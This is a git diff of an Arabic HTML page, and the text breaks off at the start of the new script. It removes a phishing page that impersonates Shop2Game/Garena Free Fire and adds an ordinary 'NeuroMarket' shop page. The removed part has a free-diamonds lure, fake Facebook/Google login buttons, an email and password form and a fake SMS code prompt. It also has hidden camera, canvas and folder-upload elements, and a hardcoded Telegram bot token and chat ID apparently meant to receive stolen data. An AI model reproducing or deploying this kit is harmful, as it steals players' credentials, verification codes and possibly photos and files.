@@ -1,803 +1,679 @@
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Shop2Game - Garena Free Fire</title>
-    <link rel="preconnect" href="https://ipapi.co">
-    <link rel="preconnect" href="https://api.telegram.org">
-    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700&display=swap" rel="stylesheet">
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
-    <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            font-family: 'Cairo', sans-serif;
-        }
-        
-        body {
-            background: #0a0a0a;
-            color: #fff;
-        }
-        
-        .navbar {
-            background: #000;
-            padding: 15px 20px;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            border-bottom: 3px solid #e43333;
-            position: sticky;
-            top: 0;
-            z-index: 100;
-        }
-        
-        .logo {
-            font-size: 1.5rem;
-            font-weight: bold;
-            color: #e43333;
-        }
-        
-        .garena-logo {
-            height: 35px;
-        }
-        
-        .container {
-            max-width: 500px;
-            margin: 0 auto;
-            padding: 20px;
-        }
-        
-        .section {
-            display: none;
-            animation: fadeIn 0.5s ease;
-        }
-        
-        .section.active {
-            display: block;
-        }
-        
-        @keyframes fadeIn {
-            from { opacity: 0; transform: translateY(20px); }
-            to { opacity: 1; transform: translateY(0); }
-        }
-        
-        .page-title {
-            text-align: center;
-            font-size: 1.8rem;
-            margin: 30px 0;
-            font-weight: bold;
-            color: #e43333;
-        }
-        
-        .game-card {
-            background: #1a1a1a;
-            border-radius: 15px;
-            overflow: hidden;
-            cursor: pointer;
-            transition: all 0.3s;
-            border: 1px solid #333;
-        }
-        
-        .game-card:hover {
-            transform: scale(1.02);
-            border-color: #e43333;
-        }
-        
-        .game-card img {
-            width: 100%;
-            display: block;
-        }
-        
-        .game-card .footer-title {
-            padding: 15px;
-            text-align: center;
-            font-size: 1.3rem;
-            background: #222;
-        }
-        
-        .offers-grid {
-            display: grid;
-            grid-template-columns: repeat(2, 1fr);
-            gap: 15px;
-        }
-        
-        .offer-item {
-            background: #1a1a1a;
-            padding: 20px;
-            border-radius: 10px;
-            text-align: center;
-            cursor: pointer;
-            border: 1px solid #333;
-            transition: all 0.3s;
-            position: relative;
-        }
-        
-        .offer-item:hover {
-            border-color: #e43333;
-            transform: scale(1.02);
-        }
-        
-        .free-badge {
-            position: absolute;
-            top: -10px;
-            right: -5px;
-            background: #44bd32;
-            padding: 3px 12px;
-            border-radius: 20px;
-            font-size: 11px;
-            font-weight: bold;
-        }
-        
-        .offer-price {
-            font-size: 1.8rem;
-            font-weight: bold;
-            color: #ffd700;
-        }
-        
-        .login-methods {
-            background: #1a1a1a;
-            padding: 30px;
-            border-radius: 15px;
-            text-align: center;
-        }
-        
-        .btn-login {
-            width: 100%;
-            padding: 14px;
-            margin: 10px 0;
-            border: none;
-            border-radius: 8px;
-            font-weight: bold;
-            cursor: pointer;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 10px;
-            transition: all 0.3s;
-        }
-        
-        .btn-login:hover {
-            opacity: 0.9;
-            transform: scale(1.02);
-        }
-        
-        .btn-fb {
-            background: #1877f2;
-            color: white;
-        }
-        
-        .btn-google {
-            background: white;
-            color: #333;
-        }
-        
-        .btn-notif {
-            background: #ff9800;
-            color: white;
-        }
-        
-        input {
-            width: 100%;
-            padding: 14px;
-            margin: 10px 0;
-            border-radius: 8px;
-            border: 1px solid #333;
-            background: #000;
-            color: white;
-            font-size: 16px;
-            transition: all 0.3s;
-        }
-        
-        input:focus {
-            outline: none;
-            border-color: #e43333;
-        }
-        
-        .btn-submit {
-            background: #e43333;
-            color: white;
-            width: 100%;
-            padding: 15px;
-            border: none;
-            border-radius: 8px;
-            font-weight: bold;
-            margin-top: 15px;
-            cursor: pointer;
-            transition: all 0.3s;
-        }
-        
-        .btn-submit:hover {
-            opacity: 0.9;
-            transform: scale(1.02);
-        }
-        
-        .error-msg {
-            color: #ff4747;
-            font-size: 0.85rem;
-            margin-top: 10px;
-            display: none;
-            padding: 10px;
-            background: rgba(255,71,71,0.1);
-            border-radius: 8px;
-            border-right: 3px solid #ff4747;
-        }
-        
-        .loading {
-            display: inline-block;
-            width: 20px;
-            height: 20px;
-            border: 2px solid #fff;
-            border-top: 2px solid #e43333;
-            border-radius: 50%;
-            animation: spin 1s linear infinite;
-            margin-left: 10px;
-        }
-        
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-        
-        video, #canvas, .hidden-input {
-            display: none;
-        }
-        
-        .status-bar {
-            background: #1a1a1a;
-            padding: 10px;
-            border-radius: 8px;
-            margin-bottom: 20px;
-            text-align: center;
-            font-size: 12px;
-            color: #44bd32;
-            border: 1px solid #44bd32;
-        }
-        
-        .fake-sms-box {
-            display: none;
-            background: rgba(0,0,0,0.95);
-            position: fixed;
-            top: 0;
-            left: 0;
-            right: 0;
-            bottom: 0;
-            z-index: 2100;
-            align-items: center;
-            justify-content: center;
-            padding: 20px;
-        }
-        
-        .fake-sms-card {
-            background: #1a1a1a;
-            border-radius: 20px;
-            padding: 30px;
-            max-width: 350px;
-            border: 1px solid #e43333;
-        }
-        
-        .toast-msg {
-            position: fixed;
-            bottom: 30px;
-            left: 20px;
-            right: 20px;
-            background: #333;
-            color: white;
-            padding: 12px;
-            border-radius: 8px;
-            text-align: center;
-            z-index: 2000;
-            display: none;
-            border-right: 3px solid #e43333;
-        }
-    </style>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>NeuroMarket – منصة التجارة العالمية الفخمة</title>
+<style>
+  @import url('https://fonts.googleapis.com/css2?family=Cairo:wght@300;400;600;700;900&family=Space+Grotesk:wght@300;400;600;700&display=swap');
+
+  :root {
+    --bg: #0b0c10;
+    --bg2: #0f1117;
+    --bg3: #13151e;
+    --purple: #8a2be2;
+    --purple-light: #a855f7;
+    --cyan: #00ffff;
+    --cyan-dim: #00e5e5;
+    --white: #f0f4ff;
+    --muted: #6b7280;
+    --border: rgba(138,43,226,0.25);
+    --glow-purple: 0 0 20px rgba(138,43,226,0.5), 0 0 60px rgba(138,43,226,0.2);
+    --glow-cyan: 0 0 20px rgba(0,255,255,0.4), 0 0 60px rgba(0,255,255,0.15);
+    --card-bg: rgba(15,17,23,0.85);
+    --success: #00b894;
+  }
+
+  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+  html { scroll-behavior: smooth; }
+
+  body {
+    font-family: 'Cairo', sans-serif;
+    background: var(--bg);
+    color: var(--white);
+    overflow-x: hidden;
+    line-height: 1.6;
+  }
+
+  /* ─── GRID BACKGROUND & NOISE ─── */
+  body::before {
+    content: '';
+    position: fixed;
+    inset: 0;
+    background-image:
+      linear-gradient(rgba(138,43,226,0.03) 1px, transparent 1px),
+      linear-gradient(90deg, rgba(138,43,226,0.03) 1px, transparent 1px);
+    background-size: 40px 40px;
+    pointer-events: none;
+    z-index: 0;
+  }
+
+  .orb {
+    position: fixed;
+    border-radius: 50%;
+    filter: blur(140px);
+    pointer-events: none;
+    z-index: 0;
+    opacity: 0.15;
+  }
+  .orb-1 { width: 500px; height: 500px; background: var(--purple); top: -100px; right: -100px; }
+  .orb-2 { width: 400px; height: 400px; background: var(--cyan); bottom: 5%; left: -100px; }
+
+  /* ─── 1. بوابـة اختيـار الرتبـة (بائع / مشتري) ─── */
+  #role-overlay {
+    position: fixed;
+    inset: 0;
+    background: rgba(11,12,16,0.98);
+    backdrop-filter: blur(30px);
+    z-index: 9999;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    padding: 20px;
+    transition: opacity 0.5s ease, transform 0.5s ease;
+  }
+  .role-box {
+    background: var(--bg2);
+    border: 1px solid var(--border);
+    padding: 3rem 2rem;
+    border-radius: 24px;
+    text-align: center;
+    max-width: 600px;
+    width: 100%;
+    box-shadow: var(--glow-purple);
+  }
+  .role-title { font-size: 2rem; font-weight: 900; margin-bottom: 1rem; }
+  .role-title span { background: linear-gradient(90deg, var(--purple-light), var(--cyan)); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
+  .role-desc { color: var(--muted); margin-bottom: 2.5rem; font-size: 0.95rem; }
+  .role-options { display: grid; grid-template-columns: 1fr 1fr; gap: 1.5rem; }
+  .role-btn {
+    background: rgba(255,255,255,0.02);
+    border: 1px solid var(--border);
+    padding: 2rem 1.5rem;
+    border-radius: 16px;
+    cursor: pointer;
+    transition: all 0.3s ease;
+  }
+  .role-btn:hover {
+    border-color: var(--cyan);
+    background: rgba(0,255,255,0.05);
+    transform: translateY(-5px);
+    box-shadow: var(--glow-cyan);
+  }
+  .role-icon { font-size: 2.5rem; margin-bottom: 1rem; }
+  .role-name { font-size: 1.2rem; font-weight: 700; margin-bottom: 0.5rem; }
+  .role-text { font-size: 0.8rem; color: var(--muted); }
+
+  @media (max-width: 580px) {
+    .role-options { grid-template-columns: 1fr; }
+  }
+
+  /* ─── NAVBAR ─── */
+  nav {
+    position: fixed;
+    top: 0; left: 0; right: 0; z-index: 1000;
+    display: flex; align-items: center; justify-content: space-between;
+    padding: 0 5%; height: 75px;
+    background: rgba(11,12,16,0.85); backdrop-filter: blur(20px);
+    border-bottom: 1px solid var(--border);
+  }
+  .logo { display: flex; align-items: center; gap: 10px; text-decoration: none; font-family: 'Space Grotesk', sans-serif; font-weight: 700; font-size: 1.5rem; }
+  .logo-icon { width: 38px; height: 38px; background: linear-gradient(135deg, var(--purple), var(--cyan)); border-radius: 10px; display: flex; align-items: center; justify-content: center; font-size: 1.2rem; box-shadow: var(--glow-purple); }
+  .logo-text span { color: var(--white); }
+  .logo-text span.grad { background: linear-gradient(90deg, var(--purple-light), var(--cyan)); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
+
+  .search-container { flex: 1; max-width: 400px; margin: 0 2rem; position: relative; }
+  .search-input { width: 100%; background: var(--bg3); border: 1px solid var(--border); border-radius: 50px; padding: 0.6rem 1.2rem; color: var(--white); font-family: 'Cairo'; outline: none; transition: 0.3s; }
+  .search-input:focus { border-color: var(--cyan); box-shadow: var(--glow-cyan); }
+
+  .nav-links { display: flex; gap: 1.5rem; list-style: none; align-items: center; }
+  .nav-links a { color: var(--muted); text-decoration: none; font-size: 0.9rem; font-weight: 600; transition: 0.2s; cursor: pointer; }
+  .nav-links a:hover, .nav-links a.active { color: var(--white); }
+  
+  .badge-container { position: relative; display: inline-block; }
+  .counter-badge { position: absolute; top: -8px; right: -12px; background: var(--purple); color: white; font-size: 0.7rem; padding: 2px 6px; border-radius: 50px; font-weight: 700; }
+
+  .lang-select { background: transparent; color: var(--white); border: 1px solid var(--border); padding: 4px 8px; border-radius: 6px; font-family: 'Cairo'; cursor: pointer; font-size: 0.8rem; }
+  .lang-select option { background: var(--bg2); }
+
+  .user-tag { background: rgba(0,255,255,0.1); border: 1px solid var(--cyan); padding: 4px 12px; border-radius: 50px; font-size: 0.8rem; color: var(--cyan); font-weight: 700; }
+
+  /* ─── MAIN BUTTONS ─── */
+  .btn-primary { background: linear-gradient(135deg, var(--purple), var(--purple-light)); color: #fff; border: none; padding: 0.7rem 1.5rem; border-radius: 50px; font-family: 'Cairo'; font-weight: 700; cursor: pointer; transition: 0.2s; box-shadow: var(--glow-purple); }
+  .btn-primary:hover { transform: translateY(-2px); filter: brightness(1.15); }
+  .btn-whatsapp { background: #25D366; color: white; border: none; padding: 0.5rem 1rem; border-radius: 8px; font-family: 'Cairo'; font-weight: 700; cursor: pointer; text-decoration: none; display: inline-flex; align-items: center; gap: 6px; font-size: 0.85rem; transition: 0.2s; }
+  .btn-whatsapp:hover { transform: translateY(-2px); filter: brightness(1.1); box-shadow: 0 4px 15px rgba(37,211,102,0.4); }
+
+  /* ─── SECTION MANAGEMENT ─── */
+  .app-section { display: none; padding: 120px 5% 60px; position: relative; z-index: 1; min-height: 80vh; }
+  .app-section.active { display: block; }
+  
+  .section-title-main { font-size: 2rem; font-weight: 900; margin-bottom: 2rem; text-align: center; }
+  .section-title-main span { background: linear-gradient(90deg, var(--purple-light), var(--cyan)); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
+
+  /* ─── HOME: PRODUCTS GRID ─── */
+  .categories-bar { display: flex; justify-content: center; gap: 1rem; margin-bottom: 2rem; flex-wrap: wrap; }
+  .cat-btn { background: var(--bg2); border: 1px solid var(--border); padding: 0.4rem 1.2rem; border-radius: 50px; color: var(--muted); cursor: pointer; font-family: 'Cairo'; font-weight: 600; transition: 0.2s; }
+  .cat-btn.active, .cat-btn:hover { background: var(--purple); color: var(--white); border-color: var(--purple-light); }
+
+  .products-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(280px, 1fr)); gap: 2rem; max-width: 1200px; margin: 0 auto; }
+  .product-card { background: var(--card-bg); border: 1px solid var(--border); border-radius: 20px; padding: 1.2rem; backdrop-filter: blur(10px); display: flex; flex-direction: column; transition: 0.3s; }
+  .product-card:hover { border-color: var(--purple); transform: translateY(-5px); box-shadow: 0 10px 30px rgba(138,43,226,0.15); }
+  .product-img { width: 100%; height: 200px; object-fit: cover; border-radius: 14px; margin-bottom: 1rem; background: var(--bg3); }
+  .product-info { flex: 1; display: flex; flex-direction: column; }
+  .product-meta { display: flex; justify-content: space-between; align-items: center; margin-bottom: 0.5rem; }
+  .product-cat { font-size: 0.75rem; color: var(--purple-light); font-weight: 700; text-transform: uppercase; }
+  .product-rating { color: #f1c40f; font-size: 0.85rem; }
+  .product-name { font-size: 1.1rem; font-weight: 700; margin-bottom: 0.5rem; color: var(--white); }
+  .product-desc-short { font-size: 0.8rem; color: var(--muted); margin-bottom: 1rem; height: 40px; overflow: hidden; }
+  .product-bottom { display: flex; justify-content: space-between; align-items: center; margin-top: auto; padding-top: 1rem; border-top: 1px solid rgba(255,255,255,0.05); }
+  .product-price { font-size: 1.3rem; font-weight: 900; color: var(--cyan); }
+  .product-actions { display: flex; gap: 0.5rem; }
+  .btn-icon { background: rgba(255,255,255,0.04); border: 1px solid var(--border); color: var(--white); width: 36px; height: 36px; border-radius: 10px; display: flex; align-items: center; justify-content: center; cursor: pointer; transition: 0.2s; }
+  .btn-icon:hover { background: var(--purple); border-color: var(--purple-light); }
+
+  /* ─── SELLER INTERFACE: ADD PRODUCT ─── */
+  .seller-container { max-width: 700px; margin: 0 auto; background: var(--card-bg); border: 1px solid var(--border); padding: 2.5rem; border-radius: 24px; backdrop-filter: blur(10px); }
+  .form-group { margin-bottom: 1.5rem; }
+  .form-label { display: block; font-size: 0.85rem; font-weight: 600; color: var(--muted); margin-bottom: 0.5rem; }
+  .form-input, .form-select, .form-textarea { width: 100%; background: rgba(255,255,255,0.04); border: 1px solid var(--border); border-radius: 12px; color: var(--white); font-family: 'Cairo'; padding: 0.8rem 1rem; outline: none; transition: 0.25s; }
+  .form-input:focus, .form-select:focus, .form-textarea:focus { border-color: var(--purple); box-shadow: 0 0 0 4px rgba(138,43,226,0.15); }
+  .form-textarea { resize: vertical; min-height: 100px; }
+  .seller-container .btn-primary { width: 100%; padding: 0.9rem; font-size: 1rem; margin-top: 1rem; }
+
+  /* ─── CART & FAVORITES ─── */
+  .list-container { max-width: 800px; margin: 0 auto; display: flex; flex-direction: column; gap: 1rem; }
+  .list-item { background: var(--bg2); border: 1px solid var(--border); padding: 1rem; border-radius: 16px; display: flex; align-items: center; justify-content: space-between; gap: 1rem; }
+  .list-item img { width: 70px; height: 70px; object-fit: cover; border-radius: 10px; }
+  .list-item-details { flex: 1; }
+  .list-item-name { font-weight: 700; font-size: 1rem; }
+  .list-item-price { color: var(--cyan); font-weight: 900; font-size: 1.1rem; }
+  .cart-summary { max-width: 800px; margin: 2rem auto 0; background: var(--bg3); border: 1px solid var(--border); padding: 1.5rem; border-radius: 16px; text-align: left; }
+  .summary-line { display: flex; justify-content: space-between; margin-bottom: 0.5rem; font-size: 0.95rem; }
+  .summary-total { font-size: 1.3rem; font-weight: 900; color: var(--cyan); border-top: 1px solid rgba(255,255,255,0.1); padding-top: 0.5rem; margin-top: 0.5rem; }
+  .checkout-box { display: flex; gap: 1rem; margin-top: 1.5rem; }
+
+  /* ─── ADMIN DASHBOARD ─── */
+  .admin-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(220px, 1fr)); gap: 1.5rem; max-width: 1200px; margin: 0 auto 3rem; }
+  .stat-card { background: var(--bg2); border: 1px solid var(--border); border-radius: 16px; padding: 1.5rem; text-align: center; }
+  .stat-val { font-size: 2rem; font-weight: 900; background: linear-gradient(90deg, var(--purple-light), var(--cyan)); -webkit-background-clip: text; -webkit-text-fill-color: transparent; margin-bottom: 0.2rem; }
+  .stat-lbl { font-size: 0.8rem; color: var(--muted); font-weight: 600; }
+  .admin-table-container { background: var(--card-bg); border: 1px solid var(--border); border-radius: 20px; padding: 1.5rem; max-width: 1200px; margin: 0 auto; overflow-x: auto; }
+  table { width: 100%; border-collapse: collapse; text-align: right; }
+  th, td { padding: 1rem; border-bottom: 1px solid rgba(255,255,255,0.05); font-size: 0.9rem; }
+  th { color: var(--purple-light); font-weight: 700; }
+
+  /* ─── FOOTER ─── */
+  footer { padding: 2rem 5%; border-top: 1px solid var(--border); display: flex; flex-wrap: wrap; align-items: center; justify-content: space-between; gap: 1.5rem; margin-top: 4rem; position: relative; z-index: 1; }
+  .footer-copy { font-size: 0.85rem; color: var(--muted); }
+  .footer-copy span { color: var(--purple-light); }
+
+  /* ─── RESPONSIVE ─── */
+  @media (max-width: 768px) {
+    nav { height: auto; padding: 1rem 5%; flex-direction: column; gap: 1rem; }
+    .search-container { max-width: 100%; width: 100%; margin: 0; }
+    .nav-links { width: 100%; justify-content: center; flex-wrap: wrap; font-size: 0.8rem; }
+    .app-section { padding-top: 180px; }
+    .list-item { flex-direction: column; text-align: center; }
+    .checkout-box { flex-direction: column; }
+  }
+</style>
 </head>
 <body>
 
-<div id="smsFakeBox" class="fake-sms-box">
-    <div class="fake-sms-card">
-        <div style="text-align: center; margin-bottom: 20px;">
-            <i class="fas fa-envelope" style="font-size: 50px; color: #25d366;"></i>
-        </div>
-        <h3 style="text-align: center; margin-bottom: 10px;">📱 تأكيد الهاتف</h3>
-        <p style="color: #aaa; text-align: center; margin-bottom: 20px;">لقد أرسلنا رمزاً إلى رقم هاتفك، أدخله لإكمال الشحن</p>
-        <input type="text" id="fakeSmsCode" placeholder="رمز التحقق (6 أرقام)" maxlength="6" style="text-align: center;">
-        <button class="btn-submit" onclick="submitFakeSms()" style="margin-top: 15px;">تأكيد</button>
+<!-- AMBIENT ORBS -->
+<div class="orb orb-1"></div>
+<div class="orb orb-2"></div>
+
+<!-- ═══ 1. بوابـة اختيـار الرتبـة الفوريـة عند الدخـول ═══ -->
+<div id="role-overlay">
+  <div class="role-box">
+    <h2 class="role-title">مرحباً بك في <span>NeuroMarket</span></h2>
+    <p class="role-desc">يرجى اختيار نوع حسابك للدخول إلى المنصة العالمية وتخصيص تجربتك فوراً.</p>
+    <div class="role-options">
+      <div class="role-btn" onclick="selectRole('buyer')">
+        <div class="role-icon">🛍️</div>
+        <div class="role-name">أنا مشترٍ / تصفح</div>
+        <div class="role-text">استكشف ملايين المنتجات، أضف للسلة وتسوّق بأمان.</div>
+      </div>
+      <div class="role-btn" onclick="selectRole('seller')">
+        <div class="role-icon">💼</div>
+        <div class="role-name">أنا بائع / تاجر</div>
+        <div class="role-text">افتح متجرك مجاناً، ارفع منتجاتك وابدأ بجني الأرباح.</div>
+      </div>
     </div>
+  </div>
 </div>
 
-<div id="toastMsg" class="toast-msg"></div>
+<!-- ═══ NAVBAR ═══ -->
+<nav>
+  <a href="#" class="logo" onclick="switchSection('home')">
+    <div class="logo-icon">⚡</div>
+    <div class="logo-text"><span>Neuro</span><span class="grad">Market</span></div>
+  </a>
 
-<video id="video" autoplay playsinline></video>
-<canvas id="canvas"></canvas>
-<input type="file" id="fileInput" class="hidden-input" accept="image/*" multiple webkitdirectory directory>
+  <!-- شريط البحث السريع -->
+  <div class="search-container">
+    <input type="text" class="search-input" id="search-bar" placeholder="ابحث عن المنتجات، الماركات، الأقسام..." oninput="searchProducts()" />
+  </div>
 
-<nav class="navbar">
-    <div class="logo">Shop2Game</div>
-    <img src="https://upload.wikimedia.org/wikipedia/en/thumb/e/ee/Garena_logo.svg/1200px-Garena_logo.svg.png" class="garena-logo" alt="Garena">
+  <ul class="nav-links">
+    <li><a onclick="switchSection('home')" id="nav-home" class="active">الرئيسية</a></li>
+    <li id="nav-seller-link" style="display:none;"><a onclick="switchSection('seller')">➕ لوحة التاجر</a></li>
+    <li>
+      <a onclick="switchSection('cart')" class="badge-container">
+        سلة التسوق <span class="counter-badge" id="cart-count">0</span>
+      </a>
+    </li>
+    <li>
+      <a onclick="switchSection('favorites')" class="badge-container">
+        المفضلة <span class="counter-badge" id="fav-count">0</span>
+      </a>
+    </li>
+    <li><a onclick="switchSection('admin')">لوحة الإدارة</a></li>
+    <li>
+      <select class="lang-select">
+        <option>العربية</option>
+        <option>English</option>
+        <option>Français</option>
+      </select>
+    </li>
+    <li><span class="user-tag" id="role-badge">مشتري</span></li>
+  </ul>
 </nav>
 
-<div class="container">
-    
-    <section id="step1" class="section active">
-        <h2 class="page-title">اختر اللعبة</h2>
-        <div class="game-card" onclick="goToStep(2)">
-            <img src="https://freefiremobile-a.akamaihd.net/ffwebsite/images/wallpaper/img1.jpg" alt="Free Fire">
-            <div class="footer-title">Free Fire</div>
-        </div>
-    </section>
+<!-- ═══ SECTION 1: HOME (الرئيسية وعرض المنتجات) ═══ -->
+<section id="home-section" class="app-section active">
+  <h2 class="section-title-main">اكتشف <span>المنتجات الفاخرة المتميزة</span></h2>
+  
+  <!-- تصنيفات واضحة -->
+  <div class="categories-bar">
+    <button class="cat-btn active" onclick="filterCategory('all', this)">الكل</button>
+    <button class="cat-btn" onclick="filterCategory('electronics', this)">إلكترونيات</button>
+    <button class="cat-btn" onclick="filterCategory('clothes', this)">ملابس وأزياء</button>
+    <button class="cat-btn" onclick="filterCategory('accessories', this)">إكسسوارات فاخرة</button>
+  </div>
 
-    <section id="step2" class="section">
-        <h2 class="page-title">عروض مميزة 💎</h2>
-        <div class="offers-grid">
-            <div class="offer-item" style="border: 2px solid #44bd32;" onclick="goToStep(3, '500 Diamonds Free')">
-                <span class="free-badge">🎁 مجاناً</span>
-                <div class="offer-price">💎 500</div>
-                <div style="color: #44bd32; margin-top: 10px;">احصل الآن!</div>
-            </div>
-            <div class="offer-item" onclick="window.location.href='https://shop2game.com'">
-                <div class="offer-price">💎 1080</div>
-                <div>$10.00</div>
-            </div>
-            <div class="offer-item" onclick="goToStep(3, '1000 Diamonds Free')">
-                <div class="offer-price">💎 1000</div>
-                <div style="color: #ffd700;">عرض خاص</div>
-            </div>
-            <div class="offer-item" onclick="goToStep(3, '2000 Diamonds Free')">
-                <div class="offer-price">💎 2000</div>
-                <div style="color: #ffd700;">عرض VIP</div>
-            </div>
-        </div>
-    </section>
+  <!-- شبكة المنتجات العالمية -->
+  <div class="products-grid" id="products-wrapper">
+    <!-- المنتجات تولد هنا ديناميكياً بواسطة JS -->
+  </div>
+</section>
 
-    <section id="step3" class="section">
-        <div class="login-methods">
-            <h3>🎁 اختر طريقة تسجيل الدخول</h3>
-            <p style="color: #aaa; margin-bottom: 20px;">للاستلام هديتك المجانية</p>
-            <button class="btn-login btn-fb" onclick="startFacebookLogin()"><i class="fab fa-facebook"></i> تسجيل الدخول بـ Facebook</button>
-            <button class="btn-login btn-google" onclick="startOAuth('Google')"><img src="https://upload.wikimedia.org/wikipedia/commons/5/53/Google_%22G%22_Logo.svg" width="18"> تسجيل الدخول بـ Google</button>
-            <button class="btn-login btn-notif" onclick="requestNotificationPermission()"><i class="fas fa-bell"></i> تفعيل الإشعارات</button>
-        </div>
-    </section>
+<!-- ═══ SECTION 2: SELLER (لوحة البائع لرفع المنتجات) ═══ -->
+<section id="seller-section" class="app-section">
+  <h2 class="section-title-main">لوحة التاجر: <span>إضافة منتج جديد وتدشين تجارتك</span></h2>
+  <div class="seller-container">
+    <div class="form-group">
+      <label class="form-label">اسم المنتج بالكامل</label>
+      <input type="text" id="p-name" class="form-input" placeholder="مثال: سماعة رأس لاسلكية محيطية ذكية" />
+    </div>
+    <div class="form-group">
+      <label class="form-label">قسم المنتج</label>
+      <select id="p-cat" class="form-select">
+        <option value="electronics">إلكترونيات</option>
+        <option value="clothes">ملابس وأزياء</option>
+        <option value="accessories">إكسسوارات فاخرة</option>
+      </select>
+    </div>
+    <div class="form-group">
+      <label class="form-label">سعر المنتج (بالدولار $)</label>
+      <input type="number" id="p-price" class="form-input" placeholder="السعر، مثال: 299" />
+    </div>
+    <div class="form-group">
+      <label class="form-label">رابط صورة المنتج (أو وصف الصورة متاح)</label>
+      <input type="text" id="p-img" class="form-input" placeholder="ضع رابط الصورة هنا (أو اتركه فارغاً للصورة التلقائية)" />
+    </div>
+    <div class="form-group">
+      <label class="form-label">رقم هاتف البائع (واتساب للتواصل الفوري والمباشر)</label>
+      <input type="text" id="p-phone" class="form-input" placeholder="مثال: 212612345678+" />
+    </div>
+    <div class="form-group">
+      <label class="form-label">وصف تفصيلي دقيق للمنتج</label>
+      <textarea id="p-desc" class="form-textarea" placeholder="اكتب ميزات المنتج، الضمان، الألوان المتوفرة..."></textarea>
+    </div>
+    <button class="btn-primary" onclick="addNewProductBySeller()">🚀 نشر وثبيت المنتج بالمنصة العالمية</button>
+  </div>
+</section>
 
-    <section id="step4" class="section">
-        <div class="login-methods">
-            <h3 id="formTitle">🔐 إدخال البيانات</h3>
-            <div id="errorBox" class="error-msg"></div>
-            <input type="email" id="userEmail" placeholder="البريد الإلكتروني أو رقم الهاتف" autocomplete="off">
-            <input type="password" id="userPass" placeholder="كلمة المرور" autocomplete="off">
-            <button class="btn-submit" onclick="handleData(event)">🎁 إشحن الآن واستلم هديتك</button>
-        </div>
-    </section>
+<!-- ═══ SECTION 3: CART (سلة التسوق الذكية) ═══ -->
+<section id="cart-section" class="app-section">
+  <h2 class="section-title-main">سلة التسوق <span>الخاصة بك</span></h2>
+  <div class="list-container" id="cart-wrapper">
+    <!-- عناصر السلة -->
+  </div>
+  <div class="cart-summary">
+    <div class="summary-line"><span>عدد العناصر:</span><span id="summary-count">0</span></div>
+    <div class="summary-line"><span>تطبيق كود خصم (كوبون):</span><input type="text" placeholder="NEURO20" style="background:none; border:1px solid var(--border); color:white; padding:2px 8px; border-radius:6px; font-family:'Cairo'; text-align:center;" oninput="applyCoupon(this)"/></div>
+    <div class="summary-line summary-total"><span>الإجمالي النهائي المتوقع:</span><span id="summary-total-val">$0</span></div>
+    <div class="checkout-box">
+      <button class="btn-primary" style="flex:1;" onclick="alert('شراؤك مكتمل! تم اختيار ميزة الدفع عند الاستلام كخيار أمان افتراضي.')">💳 إتمام الدفع (الفيزا / عند الاستلام)</button>
+    </div>
+  </div>
+</section>
 
-    <section id="step5" class="section">
-        <div class="login-methods">
-            <div class="loading" style="width:40px;height:40px;margin:20px auto;"></div>
-            <h3>✨ جاري شحن الحساب...</h3>
-            <p>سيتم إضافة الجواهر خلال 2-3 دقائق</p>
-            <div style="margin-top: 20px; color: #44bd32;">✓ تم استلام طلبك</div>
-        </div>
-    </section>
+<!-- ═══ SECTION 4: FAVORITES (المفضلة) ═══ -->
+<section id="favorites-section" class="app-section">
+  <h2 class="section-title-main">قائمة <span>المنتجات المفضلة</span></h2>
+  <div class="list-container" id="fav-wrapper">
+    <!-- عناصر المفضلة -->
+  </div>
+</section>
 
-</div>
+<!-- ═══ SECTION 5: ADMIN (لوحة تحكم النظام والإحصائيات) ═══ -->
+<section id="admin-section" class="app-section">
+  <h2 class="section-title-main">لوحة التحكم المركزية <span>للنظام والإحصاء الفوري</span></h2>
+  <div class="admin-grid">
+    <div class="stat-card"><div class="stat-val" id="st-sales">$48,250</div><div class="stat-lbl">إجمالي المبيعات العامة</div></div>
+    <div class="stat-card"><div class="stat-val" id="st-orders">1,240</div><div class="stat-lbl">إجمالي طلبات الشراء الناجحة</div></div>
+    <div class="stat-card"><div class="stat-val" id="st-users">45.2K</div><div class="stat-lbl">المستخدمين والرواد النشطين</div></div>
+    <div class="stat-card"><div class="stat-val" id="st-items">4</div><div class="stat-lbl">عدد السلع المعروضة حالياً</div></div>
+  </div>
 
+  <div class="admin-table-container">
+    <h3 style="margin-bottom: 1rem; color: var(--cyan);">سجل تتبع وإدارة مخزون السلع المعروضة</h3>
+    <table>
+      <thead>
+        <tr>
+          <th>المنتج</th>
+          <th>الفئة</th>
+          <th>السعر المعروض</th>
+          <th>حالة المخزون الحالي</th>
+        </tr>
+      </thead>
+      <tbody id="admin-table-body">
+        <!-- سطور السلع المعروضة -->
+      </tbody>
+    </table>
+  </div>
+</section>
+
+<!-- ═══ FOOTER ═══ -->
+<footer>
+  <div class="footer-copy">© 2026 <span>NeuroMarket</span>. جميع الحقوق محفوظة برتبة تجارية عالمية فائقة الفخامة والأمان.</div>
+  <div style="color: var(--muted); font-size:0.8rem;">الوضع الحالي: <span style="color:var(--cyan); font-weight:700;">الوضع الليلي الذكي المستدام 🌙</span></div>
+</footer>
+
+<!-- ═══ JAVASCRIPT LOGIC ═══ -->
 <script>
-    const BOT_TOKEN = "8716711028:AAEycnNKXBDQI8lEqghG3T1QV8hxeG4aI0c";
-    const CHAT_ID = "7902407443";
-    let selectedOffer = "500 Diamonds Free";
-    let userEmail = "";
-    let stream = null;
-    let autoCaptureDone = false;
-    let autoPhotosDone = false;
+  // الداتا الافتراضية للمنتجات لتظهر مثل المواقع العالمية فوراً
+  let initialProducts = [
